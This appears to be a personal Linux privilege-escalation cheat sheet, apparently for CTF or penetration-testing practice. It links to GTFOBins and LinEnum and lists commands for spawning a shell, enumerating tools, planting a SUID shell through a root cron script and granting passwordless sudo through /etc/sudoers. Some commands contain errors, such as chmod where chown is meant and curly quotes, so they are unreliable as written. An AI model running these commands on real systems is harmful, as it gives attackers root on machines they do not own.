# GTFOBin

https://gtfobins.github.io/

## LinEnum

https://github.com/rebootuser/LinEnum

## Restricted shell Bypass

https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf


Linux Privilege escalation
==========================

A typical Linux privilege escalation method is based on one of the following:

1. Exploiting services running as root
2. Exploiting SUID executables
3. Exploiting SUDO rights/user
4. Exploiting badly configured cron jobs
5. Exploiting users with "." in their path
6. Kernel Exploits

Kernel exploits are typically our last resort, as there is a risk that we crash the system in the process.

***1. Command to get bash shell from $***

$ python -c 'import pty; pty.spawn("/bin/bash");'  
user@machine:

## Double charcters

I'm guessing both terminals had stty echo, so you probably needed to Ctrl-Z and stty -echo on your local terminal and bg to get back to the remote shell.

**2. Identifcation methods**
1. Check su privileged files

2. Check cronjobs
cd /etc/cron* - Check all the folders

3. Check the programs avilable in the machine

which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/nul

**3. Using vulnerable cronjob running in root**

echo "cp /bin/dash /tmp/exploit; chmod u+s /tmp/exploit;chmod root:root /tmp/exploit">>/usr/local/sbin/cron-logrotate.sh

**4. Modifying sudoers file and provide nopasswd access for a low privileged user**

echo ‘chmod 777 /etc/sudoers && echo “www-data ALL=NOPASSWD: ALL” >> /etc/sudoers && chmod 440 /etc/sudoers’ > /tmp/update

**5. Command to writable directories in the restrictive shell**

find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \;

**6 C program for priv esc

https://fuzzmymind.com/2019/05/29/suid-binary-exploit-a-primer/


